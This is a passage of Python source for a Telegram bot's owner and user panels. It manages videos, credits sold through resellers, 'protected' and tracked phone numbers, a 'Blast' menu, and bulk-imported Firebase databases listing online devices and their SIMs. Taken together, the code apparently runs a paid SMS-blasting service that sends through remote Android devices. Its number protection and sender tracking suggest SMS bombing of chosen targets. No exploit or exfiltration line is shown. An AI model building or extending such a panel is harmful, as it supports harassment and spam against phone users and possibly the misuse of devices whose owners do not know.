@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal Videos Saved: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nTelegram par video bhejiyega ya URL/File ID send karein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return

    video_file_id = None
    if msg.video:
        video_file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        video_file_id = msg.document.file_id
    elif msg.text:
        video_file_id = msg.text.strip()

    if not video_file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Video send karein.", parse_mode="HTML")
        return

    d.setdefault("videos", []).append(video_file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Video Saved Successfully!</b>",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Video Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All Videos Deleted Bulk Mode!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await cq.answer("❌ Abhi koi video available nahi hai!", show_alert=True)
        return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Jis number ko protect karna hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Protected number sirf Owner/Super Admin hi use kar sakte hain.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)

    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"
        f"{em(EMOJI_CROWN, '👤')} Protected by: <code>{uid}</code>\n\n"
        f"Ab sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "number_protected", uid, f"Protected {number}")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})

    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)

    for number, protector_uid in protected.items():
        if is_owner_user:
            display_number = number
        else:
            display_number = mask_number(number)

        protector_data = d.get("users", {}).get(str(protector_uid), {})
        protector_name = protector_data.get("name", "Unknown")

        lines.append(
            f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code>\n"
            f"   {em(EMOJI_LOCK, '🔒')} Protected by: <code>{protector_uid}</code> ({protector_name})\n"
        )

    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
        return

    rows = []
    for number, protector_uid in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])

    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    number = cq.data.split("owner:protected_del:", 1)[1]

    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Protection removed for {number}!", show_alert=True)
    else:
        await cq.answer("❌ Number not found!", show_alert=True)

    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
        f"Jis number ki tracking karni hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Is number se SMS bhejne wale users ka pata chalega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []

    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": user_data.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)
                })
                break

    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja abhi tak.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"]
    lines.append(f"{em(EMOJI_STAR, '👥')} <b>Users who sent to this number:</b>\n")

    for entry in users_who_sent:
        ts = fmt_time(entry["timestamp"])
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {ts}")

    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
        f"Kitne credits sabhi users ko dena hai?\n"
        f"<i>Example: 10</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Har user ko itne credits milenge. Notification bhi bheja jayega.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
        count += 1

    d["stats"]["total_sent"] = d["stats"].get("total_sent", 0)
    save(d)

    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!\n"
        f"{em(EMOJI_MONEY, '💳')} <b>New Balance:</b> Check karein /start\n\n"
        f"{em(EMOJI_BELL, '📢')} <i>Credits add kar diye gaye hain.</i>"
    )

    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Added to All Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each\n"
        f"{em(EMOJI_STAR, '👥')} Total users: <b>{count}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{success}</b> users",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits from ALL Users</b>\n\n"
        f"Kitne credits sabhi users se katne hain?\n"
        f"<i>Example: 5</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Har user se itne credits katenge. Negative balance nahi ho sakta.\n"
        f"{em(EMOJI_CROWN, '👑')} Owners/Super Admins se credits nahi katenge.\n"
        f"{em(EMOJI_BELL, '📢')} <b>NOTIFICATION NAHI BHEJI JAYEGI</b></i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])

    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue

        current = udata.get("credits", 0)
        if current >= amount:
            udata["credits"] = current - amount
            count += 1
            total_deducted += amount
        else:
            if current > 0:
                udata["credits"] = 0
                count += 1
                total_deducted += current

    save(d)

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Deducted from Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each deducted\n"
        f"{em(EMOJI_STAR, '👥')} Total users affected: <b>{count}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} Total deducted: <b>{total_deducted}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Owners/Admins: <b>Skipped</b>\n\n"
        f"<i>{em(EMOJI_WARNING, '⚠️')} Notification nahi bheji gayi.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users")

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await cq.answer("⛔ Access nahi hai!", show_alert=True)
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return

    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Aap apne <b>half credits</b> hi transfer kar sakte hain!\n\n"
        f"{sc('step 1/2')}: Jis user ko credits dena hai uska <b>User ID</b> bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo (numbers only):", parse_mode="HTML")
        return

    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko transfer nahi kar sakte!", parse_mode="HTML")
        return

    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User ID exist nahi karta!", parse_mode="HTML")
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!", parse_mode="HTML")
        return

    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)

    half = current_credits // 2
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} <b>{sc('step 2/2')} — {sc('amount')}</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} Target User: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_ROCKET, '📤')} Max Transfer (Half): <b>{half}</b>\n\n"
        f"Kitne credits transfer karne hain? (Max {half})",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")

    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2

    if amount > max_transfer:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap sirf {max_transfer} credits transfer kar sakte hain! (Half of {current_credits})", parse_mode="HTML")
        return

    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient credits!", parse_mode="HTML")
        return

    add_credits(target_uid, amount, d)
    save(d)

    await state.clear()

    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} Received from: <code>{uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
            f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(target_uid, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Transfer Successful!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} To: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
        f"{em(EMOJI_MONEY, '💳')} Your Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")

@R.callback_query(F.data.startswith("owner:menu:"))
async def owner_menu_section(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.clear()
    section = cq.data.split(":", 2)[2]
    titles = {
        "blast": "🚀 Blast",
        "credits": "💳 Credits",
        "users": "👥 Users",
        "premium": "💎 Premium",
        "staff": "🛡 Staff",
        "communication": "📢 Communication",
        "tools": "🧰 Tools",
        "settings": "⚙️ Settings",
    }
    await cq.message.edit_text(
        f"<b>{titles.get(section, 'Owner')}</b>\n\nSelect an option below:",
        reply_markup=owner_submenu_kb(section, d, uid),
        parse_mode="HTML",
    )
    await cq.answer()


@R.callback_query(F.data == "admin:menu:users")
async def admin_menu_users(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    await state.clear()
    await cq.message.edit_text("<b>🛡 User Control</b>\n\nSelect an option below:", reply_markup=admin_submenu_kb("users"), parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data.startswith("reseller:menu:"))
async def reseller_menu_section(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_reseller(cq.from_user.id, d):
        await cq.answer("🚫 Reseller Only!", show_alert=True)
        return
    await state.clear()
    section = cq.data.split(":", 2)[2]
    title = "💳 Credits" if section == "credits" else "🛡 User Control"
    await cq.message.edit_text(f"<b>{title}</b>\n\nSelect an option below:", reply_markup=reseller_submenu_kb(section), parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data.startswith("user:menu:"))
async def user_menu_section(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    await state.clear()
    if not can_use(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    section = cq.data.split(":", 2)[2]
    title = "💳 Credits" if section == "credits" else "📊 Activity"
    await cq.message.edit_text(f"<b>{title}</b>\n\nSelect an option below:", reply_markup=user_submenu_kb(section), parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d, uid), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0

    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFirebase URL bhejo:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with https://. Dobara bhejo:", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n{em(EMOJI_STAR, '🏷')} {label}\n{em(EMOJI_GEAR, '🔗')} <code>{url}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
        f"Aap ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
        f"<b>Supported File Formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>Duplicate URLs auto-skip ho jayenge!</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return

    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!", parse_mode="HTML")
        return

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')

    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}

    added_count = 0
    skipped_count = 0
    processed_in_file = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]

        if not (url.startswith("http://") or url.startswith("https://")):
            continue

        url = url.rstrip("/")

        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue

        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({
            "id": fb_id,
            "url": url,
            "label": label,
            "added_at": int(time.time())
        })
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase TXT Processed!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Successfully Added : <b>{added_count}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Skipped (Duplicates) : <b>{skipped_count}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Firebase DBs  : <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid `.txt` document file upload karein!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0

    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(
            f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b>\n"
            f"     {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:25]}\n"
            f"     {em(EMOJI_STAR, '📶')} SIMs: {len(dv['sims']) or 1}"
        )
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:stats"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    owners = d.get("owners", [])
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
